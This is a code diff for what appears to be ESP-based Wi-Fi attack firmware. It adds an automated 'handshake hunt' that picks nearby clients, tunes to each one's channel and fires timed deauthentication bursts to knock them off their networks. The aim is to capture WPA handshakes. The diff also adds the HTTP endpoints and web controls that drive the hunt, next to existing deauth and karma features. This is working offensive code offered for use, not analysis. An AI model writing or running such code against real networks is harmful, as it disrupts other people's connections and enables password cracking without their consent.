@@ -492,6 +492,50 @@ volatile uint32_t disassocCount = 0;
 volatile bool karmaActive = false;
 uint8_t karmaBssid[6] = {0};
 
+// -------------------- Auto Handshake Hunt (Pwnagotchi-like) --------------------
+volatile bool huntActive = false;
+volatile uint32_t huntsPerformed = 0;
+volatile uint32_t huntRatePps = 10;
+volatile uint32_t huntBurstMs = 2000;    // deauth burst duration
+volatile uint32_t huntCooldownMs = 3000; // time between hunts
+Ticker huntTicker;
+
+static void startDeauthBurst(const uint8_t target[6], const uint8_t bssid[6], uint32_t ratePps, uint32_t durationMs) {
+  deauthIntervalMs = 1000UL / (ratePps == 0 ? 1 : ratePps);
+  deauthEndAtMs = durationMs ? (millis() + durationMs) : 0;
+  memcpy((void*)deauthTarget, target, 6);
+  memcpy((void*)deauthBssid, bssid, 6);
+  deauthTestActive = true;
+  deauthSentCount = 0;
+  deauthBroadcast = false;
+  deauthTicker.detach();
+  deauthTicker.attach_ms(deauthIntervalMs, sendDeauth);
+}
+
+void huntStep() {
+  if (!huntActive) return;
+  if (deauthTestActive) return; // wait for previous burst to finish
+  // Pick a client without handshake seen
+  for (int i = 0; i < (int)(sizeof(g_clients)/sizeof(g_clients[0])); i++) {
+    if (g_clients[i].mac[0] == 0 && g_clients[i].mac[1] == 0 && g_clients[i].mac[2] == 0 &&
+        g_clients[i].mac[3] == 0 && g_clients[i].mac[4] == 0 && g_clients[i].mac[5] == 0) continue;
+    if (g_clients[i].handshakeSeen) continue;
+    // Need associated BSSID (or best-effort: use lastChannel)
+    uint8_t bssid[6]; memcpy(bssid, g_clients[i].associatedBssid, 6);
+    if (bssid[0]==0 && bssid[1]==0 && bssid[2]==0 && bssid[3]==0 && bssid[4]==0 && bssid[5]==0) continue;
+    // Ensure channel set to client's last seen channel
+    uint8_t ch = g_clients[i].lastChannel;
+    if (ch >= 1 && ch <= 14) {
+      channelHopTicker.detach();
+      setChannel(ch);
+      restartAccessPointOnChannel(ch);
+    }
+    startDeauthBurst(g_clients[i].mac, bssid, huntRatePps, huntBurstMs);
+    huntsPerformed++;
+    break;
+  }
+}
+
 // Channel utilization (rolling 1s window snapshot)
 volatile uint32_t chPps[15] = {0};
 volatile uint32_t chPpsLast[15] = {0};
@@ -634,6 +678,11 @@ String buildStatusJson() {
   s += "\"deauthBroadcast\":"; s += (deauthBroadcast ? "true" : "false"); s += ",";
   s += "\"deauthRatePps\":"; s += String(deauthIntervalMs ? (1000UL / deauthIntervalMs) : 0); s += ",";
   s += "\"deauthEndsAtMs\":"; s += String(deauthEndAtMs); s += ",";
+  s += "\"huntActive\":"; s += (huntActive ? "true" : "false"); s += ",";
+  s += "\"huntsPerformed\":"; s += String(huntsPerformed); s += ",";
+  s += "\"huntRatePps\":"; s += String(huntRatePps); s += ",";
+  s += "\"huntBurstMs\":"; s += String(huntBurstMs); s += ",";
+  s += "\"huntCooldownMs\":"; s += String(huntCooldownMs); s += ",";
   
   char macStr[18];
   if (deauthTestActive) {
@@ -773,6 +822,10 @@ const char INDEX_HTML[] PROGMEM = R"HTML(
       if (document.getElementById('deauthRateNow')) {
         document.getElementById('deauthRateNow').textContent = j.deauthRatePps || 0;
       }
+      if (document.getElementById('huntActive')) {
+        document.getElementById('huntActive').textContent = j.huntActive ? 'Active' : 'Inactive';
+        document.getElementById('huntsPerformed').textContent = j.huntsPerformed || 0;
+      }
       if (deauthActive) {
         document.getElementById('deauthTarget').value = j.deauthTarget || '';
         document.getElementById('deauthBssid').value = j.deauthBssid || '';
@@ -841,6 +894,15 @@ const char INDEX_HTML[] PROGMEM = R"HTML(
       await call('/karma?enable=' + (on ? '1' : '0') + (b ? ('&bssid=' + encodeURIComponent(b)) : ''));
     }
 
+    async function startHunt() {
+      const rate = document.getElementById('huntRate').value || '10';
+      const burst = document.getElementById('huntBurst').value || '2000';
+      const cooldown = document.getElementById('huntCooldown').value || '3000';
+      await call(`/hunt/start?rate=${encodeURIComponent(rate)}&burst=${encodeURIComponent(burst)}&cooldown=${encodeURIComponent(cooldown)}`);
+      status();
+    }
+    async function stopHunt() { await call('/hunt/stop'); status(); }
+
     function init() {
       startMatrix();
       status(); setInterval(() => { status(); if (!document.getElementById('observations').classList.contains('hide')) loadObservations(); }, 1200);
@@ -868,6 +930,20 @@ const char INDEX_HTML[] PROGMEM = R"HTML(
           <div class="row"><strong>Channel:</strong> <span id="chNow">1</span> <span class="pill">PPS: <span id="pps">0</span></span> <span class="pill">Packets: <span id="pkt">0</span></span></div>
           <div class="row"><button class="btn" onclick="call('/start').then(status)">Start</button><button class="btn" onclick="call('/stop').then(status)">Stop</button>
           <input id="ch" type="number" min="1" max="14" value="1" /><button class="btn" onclick="setCh()">Set CH</button><button class="btn" onclick="hop(true)">Hop On</button><button class="btn" onclick="hop(false)">Hop Off</button></div>
+        </div>
+        <div class="card">
+          <div class="row"><strong>Auto Handshake Hunt</strong></div>
+          <div class="row">
+            <input id="huntRate" type="number" min="1" max="100" value="10" placeholder="Rate (pps)" />
+            <input id="huntBurst" type="number" min="100" max="30000" value="2000" placeholder="Burst ms" />
+            <input id="huntCooldown" type="number" min="100" max="60000" value="3000" placeholder="Cooldown ms" />
+            <button class="btn" onclick="startHunt()">Start</button>
+            <button class="btn btn-danger" onclick="stopHunt()">Stop</button>
+          </div>
+          <div class="row">
+            <span class="pill">Hunt: <span id="huntActive">Inactive</span></span>
+            <span class="pill">Performed: <span id="huntsPerformed">0</span></span>
+          </div>
         </div>
         <div class="card">
           <div class="row"><strong>Mgmt counters</strong></div>
@@ -1206,6 +1282,21 @@ void setupHttpHandlers() {
     deauthTestActive = false;
     deauthTicker.detach();
     deauthBroadcast = false;
+    server.send(200, "text/plain", "ok");
+  });
+
+  // Hunt control
+  server.on("/hunt/start", HTTP_GET, []() {
+    if (server.hasArg("rate")) { uint32_t r = server.arg("rate").toInt(); huntRatePps = r < 1 ? 1 : (r > 100 ? 100 : r); }
+    if (server.hasArg("burst")) { uint32_t b = server.arg("burst").toInt(); huntBurstMs = b > 30000 ? 30000 : b; }
+    if (server.hasArg("cooldown")) { uint32_t c = server.arg("cooldown").toInt(); huntCooldownMs = c > 60000 ? 60000 : c; }
+    huntActive = true; huntsPerformed = 0;
+    huntTicker.detach();
+    huntTicker.attach_ms(huntCooldownMs, huntStep);
+    server.send(200, "text/plain", "ok");
+  });
+  server.on("/hunt/stop", HTTP_GET, []() {
+    huntActive = false; huntTicker.detach();
     server.send(200, "text/plain", "ok");
   });
 
